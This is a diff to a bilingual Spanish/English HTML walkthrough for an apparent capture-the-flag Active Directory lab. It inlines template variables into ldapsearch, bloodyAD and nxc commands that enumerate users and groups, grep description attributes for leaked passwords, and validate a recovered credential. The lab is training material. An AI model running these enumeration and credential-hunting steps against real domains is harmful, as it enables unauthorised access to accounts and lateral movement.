@@ -38,35 +38,32 @@ ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre
 
     <h3>3 · Bind autenticado con la cuenta de servicio</h3>
     <p>El servidor tiene <code>ldap server require strong auth = no</code>, así que acepta binds simples en texto claro.</p>
-    <pre>export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
-export DC={{ ad_dc_ip }}
-
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
 
     <p><strong>Nota sobre este Domain Controller:</strong> <code>nxc ldap</code>, <code>ldapdomaindump</code> y <code>windapsearch</code> usan un bind NTLM (<code>ldap3</code>/impacket Sicily) que el servidor Samba corta a media negociación (<code>LDAPSessionTerminatedByServerError</code> / <code>IndexError: list index out of range</code>) — <strong>fallan incluso solo para autenticar</strong>, no es un problema de un módulo concreto. El bind LDAP <strong>simple</strong> (<code>ldapsearch -x -D ...</code>, usuario+contraseña en claro) sí funciona siempre; <code>bloodyAD</code> también funciona porque usa su propia librería (<code>badldap</code>), no <code>ldap3</code>.</p>
 
     <h3>4 · Volcar usuarios, grupos y equipos</h3>
     <pre># Usuarios (sin cuentas de máquina)
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(&(objectCategory=person)(objectClass=user))' \
   sAMAccountName description memberOf userAccountControl
 
 # Grupos y sus miembros
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(objectClass=group)' sAMAccountName member
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=group)' sAMAccountName member
 
 # Lo mismo con bloodyAD (alternativa que sí funciona contra este DC)
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
 
     <h3>5 · Buscar credenciales en los atributos</h3>
     <p>El atributo <code>description</code> es legible por cualquier usuario autenticado y es donde más credenciales se filtran en dominios reales.</p>
     <pre># Con bloodyAD
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
 
 # A mano, filtrando por palabras clave
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(description=*)' sAMAccountName description \
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(description=*)' sAMAccountName description \
   | grep -iE 'pass|pwd|HL\{'</pre>
     <p>El usuario <code>t.rodriguez</code> devuelve:</p>
     <pre>sAMAccountName: t.rodriguez
@@ -75,7 +72,7 @@ description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024!
     <h3>6 · Capturar la flag</h3>
     <pre>HL{···}</pre>
     <p>Además te llevas una credencial válida más: <code>t.rodriguez / Welcome2024!</code>.</p>
-    <pre>nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'</pre>
+    <pre>nxc smb {{ ad_dc_ip }} -u 't.rodriguez' -p 'Welcome2024!'</pre>
 
     <h3>Mitigación</h3>
     <ul>
@@ -103,35 +100,32 @@ ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40</pre
 
     <h3>3 · Authenticated bind with the service account</h3>
     <p>The server runs <code>ldap server require strong auth = no</code>, so it accepts cleartext simple binds.</p>
-    <pre>export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
-export DC={{ ad_dc_ip }}
-
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
+    <pre>ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=user)' sAMAccountName | grep sAMAccountName</pre>
 
     <p><strong>Note about this Domain Controller:</strong> <code>nxc ldap</code>, <code>ldapdomaindump</code> and <code>windapsearch</code> use an NTLM bind (<code>ldap3</code>/impacket Sicily) that the Samba server cuts off mid-negotiation (<code>LDAPSessionTerminatedByServerError</code> / <code>IndexError: list index out of range</code>) — they fail just to authenticate, it's not a single-module problem. A <strong>simple</strong> LDAP bind (<code>ldapsearch -x -D ...</code>, plaintext user+password) always works; <code>bloodyAD</code> also works because it uses its own library (<code>badldap</code>), not <code>ldap3</code>.</p>
 
     <h3>4 · Dump users, groups and computers</h3>
     <pre># Users (machine accounts excluded)
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(&(objectCategory=person)(objectClass=user))' \
   sAMAccountName description memberOf userAccountControl
 
 # Groups and their members
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(objectClass=group)' sAMAccountName member
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(objectClass=group)' sAMAccountName member
 
 # Same thing with bloodyAD (alternative that does work against this DC)
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName</pre>
 
     <h3>5 · Hunt for credentials in the attributes</h3>
     <p>The <code>description</code> attribute is readable by any authenticated user and is where most credentials leak in real domains.</p>
     <pre># With bloodyAD
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description
 
 # By hand, filtering on keywords
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" '(description=*)' sAMAccountName description \
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(description=*)' sAMAccountName description \
   | grep -iE 'pass|pwd|HL\{'</pre>
     <p>User <code>t.rodriguez</code> returns:</p>
     <pre>sAMAccountName: t.rodriguez
@@ -140,7 +134,7 @@ description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024!
     <h3>6 · Capture the flag</h3>
     <pre>HL{···}</pre>
     <p>You also walk away with one more valid credential: <code>t.rodriguez / Welcome2024!</code>.</p>
-    <pre>nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'</pre>
+    <pre>nxc smb {{ ad_dc_ip }} -u 't.rodriguez' -p 'Welcome2024!'</pre>
 
     <h3>Mitigation</h3>
     <ul>
